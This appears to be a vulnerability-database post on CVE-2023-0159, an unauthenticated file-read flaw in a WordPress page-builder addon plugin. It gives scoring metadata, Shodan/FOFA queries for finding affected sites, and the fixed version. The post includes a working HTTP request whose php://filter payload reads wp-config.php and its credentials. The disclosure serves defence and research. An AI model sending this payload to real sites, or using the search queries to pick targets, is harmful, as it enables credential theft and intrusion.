---
layout: post
cve_id: CVE-2023-0159
title: Extensive VC Addons for WPBakery page builder < 1.9.1 - Unauthenticated RCE
pcap: true
pcap_path: /pcaps/2023/CVE-2023-0159.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2023/CVE-2023-0159.yaml
snort2_rule: N/A
snort3_rule: N/A
author: c4sper0
severity: high
impact: 'Unauthenticated attackers can exploit parameter validation flaws in the template
  loading mechanism to read arbitrary files including wp-config.php and escalate to
  remote code execution using PHP filter chains.

  '
remediation: Fixed in 1.9.1
reference:
- https://wpscan.com/vulnerability/239ea870-66e5-4754-952e-74d4dd60b809/
- https://github.com/im-hanzou/EVCer
- https://github.com/nomi-sec/PoC-in-GitHub
- https://github.com/xu-xiang/awesome-security-vul-llm
- https://wordpress.org/plugins/extensive-vc-addon/
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
  cvss-score: 7.5
  cve-id: CVE-2023-0159
  epss-score: 0.91507
  epss-percentile: 0.99649
  cpe: cpe:2.3:a:wprealize:extensive_vc_addons_for_wpbakery_page_builder:*:*:*:*:*:wordpress:*:*
metadata:
  max-request: 1
  vendor: wprealize
  product: extensive_vc_addons_for_wpbakery_page_builder
  framework: wordpress
  shodan-query: http.html:/wp-content/plugins/extensive-vc-addon/
  fofa-query: body=/wp-content/plugins/extensive-vc-addon/
  publicwww-query: /wp-content/plugins/extensive-vc-addon/
tags:
- cve
- cve2023
- wordpress
- wpbakery
- wp-plugin
- lfi
- extensive-vc-addon
- wprealize
- vkev
- vuln
---

## ðŸ” Vulnerability Description
The plugin does not validate a parameter passed to the php extract function when loading templates, allowing an unauthenticated attacker to override the template path to read arbitrary files from the hosts file system. This may be escalated to RCE using PHP filter chains.


## ðŸŒ HTTP Request
```nohighlight
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0
Connection: close
Content-Length: 124
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
action=extensive_vc_init_shortcode_pagination&options[template]=php://filter/convert.base64-encode/resource=../wp-config.php
```

